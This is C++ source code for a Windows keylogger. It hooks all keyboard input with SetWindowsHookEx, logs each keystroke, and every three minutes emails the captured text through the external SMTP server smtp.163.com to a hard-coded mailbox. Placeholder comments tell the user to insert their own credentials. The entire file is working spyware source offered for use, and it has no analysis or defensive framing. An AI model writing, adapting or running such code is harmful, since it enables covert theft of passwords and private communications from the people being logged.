#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <WinSock2.h>
#include <windows.h>
#include <ctime>
#include <fstream>
#include <sstream>
#include <iostream>
#include "mail.h"
#pragma comment(lib,"ws2_32.lib")
using namespace std;

#define   _WIN32_WINNT  0x0500 

bool Control;
bool shouldend = false;
HHOOK MyHook;
string HookData;
char HostName[100];
bool Entered;
int lasttime;
HOSTENT * LocalHost;

int CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam3);
ostringstream sout;

void SendHookMail();

//Terminate signal received
void EndProgram()
{
	SendHookMail();
	exit(0);
}

//Send result to mail
void SendHookMail()
{
	HookData = sout.str();
	SendEmail("smtp.163.com"/*TODO: Replace with your own mailbox's SMTP server*/, "myhookmail@163.com" /*Your own mailbox that you want to send from*/, "abcdefg" /*Your mail password*/, "myhookmail@163.com" /*Mailbox that you want to send results to*/, HookData);
	sout.flush();
}

int CALLBACK WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
	WSADATA wsa;
	WSAStartup(MAKEWORD(2, 0), &wsa);

	gethostname(HostName, sizeof(HostName));
	LocalHost = gethostbyname(HostName);
	in_addr* addr = (in_addr*)*LocalHost->h_addr_list;
	IPCnt = LocalHost->h_length;
	for (int i = 0; i < IPCnt; i++)
	{
		IpAddr[i] = inet_ntoa(addr[i]);
	}
	MyHook = SetWindowsHookEx(WH_KEYBOARD_LL,
		(HOOKPROC)&KeyboardProc,
		GetModuleHandle(NULL),
		NULL);
	MSG msg;
	while (!GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(MyHook);
	return 0;
}

int CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	//Send a mail every 3 minutes if any key is pressed
	if (time(0) - lasttime >= 180 && Entered)
	{
		SendHookMail();
		Entered = false;
	}
	//Terminate signal received. Send the last characters and exit the program
	if (shouldend)
	{
		UnhookWindowsHookEx(MyHook);
		EndProgram();
	}
//Macro definition to output the key ID to the output string
#define KEY_STRING_PAIR(_Key, _String) \
case _Key:	\
	sout << _String;  \
	break;
	//If a key is pressed the "wParam == WM_KEYDOWN" condition is satisfied and will go into the switch 
	if (wParam == WM_KEYDOWN)
	{
		if (!Entered)
		{
			Entered = true;
			lasttime = time(0);
		}
		int code = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;
		switch (code)
		{
		case 160:
		KEY_STRING_PAIR(VK_SHIFT, "[Shift]")
		KEY_STRING_PAIR(VK_DOWN, "[Down]")
		KEY_STRING_PAIR(VK_UP, "[Up]")
		KEY_STRING_PAIR(VK_LEFT, "[Left]")
		KEY_STRING_PAIR(VK_RIGHT, "[Right]")
		KEY_STRING_PAIR(VK_OEM_PERIOD, ".")
		KEY_STRING_PAIR(VK_OEM_1, ";")
		KEY_STRING_PAIR(VK_OEM_2, "/")
		//The terminate signal is Control + ~
		case VK_OEM_3:
			sout <<"~";
			if (Control)
				shouldend = true;
			break;
		KEY_STRING_PAIR(VK_OEM_4, "[")
		KEY_STRING_PAIR(VK_OEM_5, "\\")
		KEY_STRING_PAIR(VK_OEM_6, "]")
		KEY_STRING_PAIR(VK_OEM_7, "'")
		KEY_STRING_PAIR(VK_OEM_8, ",")
		KEY_STRING_PAIR(VK_OEM_COMMA, ",")
		KEY_STRING_PAIR(VK_OEM_PLUS, "+")
		KEY_STRING_PAIR(VK_OEM_MINUS, "-")
		KEY_STRING_PAIR(VK_TAB, "[Tab]")
		KEY_STRING_PAIR(VK_BACK, "[Backspace]")
		KEY_STRING_PAIR(VK_RETURN, "[Enter]")
		case 162:
		case VK_CONTROL:
			Control = true;
			sout <<"[Control]";
			break;
		KEY_STRING_PAIR(VK_ESCAPE, "[Esc]")
		case 91:
		KEY_STRING_PAIR(VK_HOME, "[HOME]")
		KEY_STRING_PAIR(VK_ADD, "+")
		KEY_STRING_PAIR(VK_SUBTRACT, "-")
		KEY_STRING_PAIR(VK_MULTIPLY, "*")
		KEY_STRING_PAIR(VK_DECIMAL, ".")
		KEY_STRING_PAIR(VK_DIVIDE, "/")
		KEY_STRING_PAIR(0x21, "[PAGE UP]")
		KEY_STRING_PAIR(0x22, "[PAGE DOWN]")
		default:
			if (code > 111 && code < 124)
				sout << "[F" << code - 111 << "]";
			if (code >= 0x60 && code <= 0x69)
				sout << (int)(code - 0x60);
			else
				sout << (char)code;
		}
	}
	//Control is released
	if (wParam == WM_KEYUP && (((KBDLLHOOKSTRUCT*)lParam)->vkCode == VK_CONTROL || ((KBDLLHOOKSTRUCT*)lParam)->vkCode == 162))
		Control = false;
	//Have to be done to prevent system from becoming useless
	return CallNextHookEx(MyHook, nCode, wParam, lParam);
}